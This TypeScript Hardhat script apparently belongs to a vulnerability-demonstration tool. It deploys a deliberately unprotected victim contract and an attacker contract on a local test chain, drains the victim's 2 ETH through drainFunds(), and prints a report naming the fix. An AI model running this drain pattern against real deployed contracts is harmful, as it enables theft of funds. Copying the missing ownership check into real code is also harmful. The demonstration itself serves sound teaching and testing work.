import hre from "hardhat";
import { parseEther, formatEther } from "ethers";
import { buildResult } from "./buildResult";

async function main() {
  const startTime = Date.now();
  const [, attacker] = await hre.ethers.getSigners();

  const VictimFactory = await hre.ethers.getContractFactory("AccessControlVictim");
  const victim = await VictimFactory.deploy({ value: parseEther("2") });
  await victim.waitForDeployment();
  const victimAddress = await victim.getAddress();

  const initialBalance: bigint = await (victim as any).getBalance();

  const AttackerFactory = await hre.ethers.getContractFactory("AccessControlAttacker");
  const attackerContract = await AttackerFactory.connect(attacker).deploy(victimAddress);
  await attackerContract.waitForDeployment();
  const attackerAddress = await attackerContract.getAddress();

  const t1 = Date.now();
  await (attackerContract as any).connect(attacker).attack();
  const endTime = Date.now();

  const finalBalance: bigint = await (victim as any).getBalance();
  const stolenAmount: bigint = initialBalance - finalBalance;
  const attackerBal: bigint = await (attackerContract as any).getBalance();

  const result = buildResult({
    contractName: "AccessControlVictim",
    contractAddress: victimAddress,
    attackType: "accesscontrol",
    targetFunction: "drainFunds()",
    severity: "Critical",
    initialBalance,
    finalBalance,
    stolenAmount,
    startTime,
    endTime,
    transactions: [
      {
        step: 1,
        description: "Attacker calls drainFunds() — no ownership check",
        from: attacker.address,
        to: victimAddress,
        value: formatEther(stolenAmount),
        unit: "ETH",
        timestampMs: t1,
        balanceAfter: { victim: "0.0", attacker: formatEther(attackerBal) },
      },
    ],
    timeline: [
      "AccessControlVictim deployed with 2 ETH",
      "Attacker has no owner role",
      "Attacker calls drainFunds(attackerAddress)",
      "No require(msg.sender == owner) — call succeeds",
      "All ETH transferred to attacker",
    ],
    report: {
      vulnerabilityType: "Access Control",
      affectedFunction: "drainFunds()",
      explanation:
        "drainFunds() transfers the entire contract balance to any caller. There is no ownership check — anyone can drain the contract.",
      fix: "Add require(msg.sender == owner) or use OpenZeppelin Ownable. Restrict sensitive functions to authorized callers.",
    },
  });

  process.stdout.write("SIMULATION_RESULT:" + JSON.stringify(result) + "\n");
}

main().catch(e => {
  console.error(e);
  process.exit(1);
});
